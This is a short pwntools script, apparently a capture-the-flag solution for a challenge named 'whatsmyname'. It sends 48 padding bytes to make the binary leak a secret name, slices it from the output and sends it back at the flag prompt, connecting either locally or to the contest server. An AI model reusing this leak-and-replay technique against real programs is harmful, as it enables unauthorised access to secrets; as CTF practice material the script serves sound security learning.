#!/usr/bin/env python3

from pwn import *

exe = ELF('whatsmyname')

context.binary = exe
context.log_level='debug'


def conn():
    if args.REMOTE:
        io = remote("challs.actf.co", 31223)
    else:
        io = process(exe.path)
        if args.DEBUG:
            gdb.attach(io)

    return io


io = conn()
io.sendline(b'A'*48)
leak = io.recvline()
name = leak[-49:-2]
print(name)
io.sendlineafter(b'flag!',name)
io.interactive()
